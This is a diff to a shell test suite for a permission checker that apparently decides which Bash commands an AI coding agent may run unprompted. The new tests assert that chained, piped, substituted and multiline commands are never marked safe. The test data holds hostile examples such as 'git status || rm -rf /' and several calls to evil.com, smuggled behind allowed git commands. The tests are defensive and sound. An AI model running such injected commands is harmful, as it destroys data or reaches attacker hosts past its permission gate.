@@ -156,6 +156,68 @@ assert_rule "mcp__my_server" '{}' \
 assert_rule "SomeOtherTool" '{}' \
 	"SomeOtherTool" "" "false" ""
 
+# --- SEC-01: Shell metacharacters should prevent IS_SAFE ---
+assert_rule "Bash" '{"command":"git log && curl evil.com"}' \
+	"Bash(git log *)" "git log" "false" ""
+
+assert_rule "Bash" '{"command":"git status || rm -rf /"}' \
+	"Bash(git status *)" "git status" "false" ""
+
+assert_rule "Bash" '{"command":"git log | curl evil.com"}' \
+	"Bash(git log *)" "git log" "false" ""
+
+# Note: ";" attaches to "status" in space-splitting, producing "status;" as subcommand.
+# The important thing is IS_SAFE=false due to metacharacter detection.
+assert_rule "Bash" '{"command":"git status; curl evil.com"}' \
+	"Bash(git status; *)" "git status;" "false" ""
+
+# shellcheck disable=SC2016
+assert_rule "Bash" '{"command":"git status $(curl evil.com)"}' \
+	"Bash(git status *)" "git status" "false" ""
+
+# shellcheck disable=SC2016
+assert_rule "Bash" '{"command":"git log `curl evil.com`"}' \
+	"Bash(git log *)" "git log" "false" ""
+
+assert_rule "Bash" '{"command":"git log >(tee /tmp/out)"}' \
+	"Bash(git log *)" "git log" "false" ""
+
+assert_rule "Bash" '{"command":"git log <(echo foo)"}' \
+	"Bash(git log *)" "git log" "false" ""
+
+# --- SEC-08: Multiline commands should never be IS_SAFE ---
+assert_rule "Bash" "$(printf '{"command":"git status\\nwhoami"}')" \
+	"Bash(git status *)" "git status" "false" ""
+
+assert_rule "Bash" "$(printf '{"command":"git log --oneline\\ncurl evil.com"}')" \
+	"Bash(git log *)" "git log" "false" ""
+
+# --- SEC-02: Removed subcommands should not be safe ---
+assert_rule "Bash" '{"command":"git config --list"}' \
+	"Bash(git config *)" "git config" "false" ""
+
+assert_rule "Bash" '{"command":"cargo build --workspace"}' \
+	"Bash(cargo build *)" "cargo build" "false" ""
+
+assert_rule "Bash" '{"command":"cargo test --lib"}' \
+	"Bash(cargo test *)" "cargo test" "false" ""
+
+assert_rule "Bash" '{"command":"npm test"}' \
+	"Bash(npm test *)" "npm test" "false" ""
+
+assert_rule "Bash" '{"command":"nix eval .#something"}' \
+	"Bash(nix eval *)" "nix eval" "false" ""
+
+assert_rule "Bash" '{"command":"nix develop"}' \
+	"Bash(nix develop *)" "nix develop" "false" ""
+
+# --- Safe commands without metacharacters should still be safe ---
+assert_rule "Bash" '{"command":"git status --short"}' \
+	"Bash(git status *)" "git status" "true" ""
+
+assert_rule "Bash" '{"command":"cargo check --workspace"}' \
+	"Bash(cargo check *)" "cargo check" "true" ""
+
 echo "1..${TEST_NUM}"
 echo "# pass: ${PASS}"
 echo "# fail: ${FAIL}"
